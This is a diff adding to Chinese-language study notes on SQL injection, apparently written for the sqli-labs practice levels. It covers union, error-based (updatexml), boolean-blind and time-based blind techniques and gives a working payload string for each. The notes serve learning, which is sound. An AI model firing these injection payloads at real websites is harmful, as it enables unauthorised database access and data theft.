@@ -104,7 +104,7 @@ http://www.mysql.com/Less-1/?id=-1' union select 1,2,group_concat(username ,0x7e
 2. union select 试错：union select 1--+ → union select 1,2--+ → union select 1,2,3--+，直到不报错即为列数匹配。  
 
 二、 报错注入  
-页面无回显，但报错时能够回显报错信息  
+页面无回显，但报错时能够回显报错信息（可在报错字段注出数据库信息）    
 十大报错函数：
 floor()，extractvalue()，updatexml()，exp()，GeometryCollection()，polygon()，multipoint()，multilinestring()，linestring()，multipolygon()  
 
@@ -113,5 +113,25 @@ http://www.mysql.com/Less-5/?id=1
 ?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  
 
 三、 布尔盲注  
-之所以叫盲注，是因为无论
+之所以叫盲注，是因为在注入点报错后，不会暴露报错字段，只有正确和报错页面不同，且均无回显  
+此时通过页面返回正确或者错误两个差异页面，来对我们想要查询的数据其进行判断  
+http://www.mysql.com/Less-8/?id=1  
+
+?id=1' union select 1,2,3 -- +  不报错->判定有三占位符  
+?id=1' and(length(database()))=8 --+  数据库长度=8 则不报错  
+?id=1' and (ascii(substr(database(),1,1)))=115 --+   substr(x,1,1)从x的第一个字符开始截取1位  
+database()    //  security  
+substr(security,1,1)   // s  
+ascii(s)  //  115  
+
+https://www.runoob.com/w3cnote/ascii.html  码表
+
+四、 延时盲注  
+当布尔盲注真假页面差异不明显时，就需要延时盲注判断  
+利用if函数对查询语句进行判断，接着根据需求而设定对应的sleep函数数值。  
+http://www.mysql.com/Less-9/?id=1  
+?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),3)--+  if第一个条件真，执行sleep(5) ，假则执行“3” 直接响应  
+
+五、 宽字节注入  
+
 
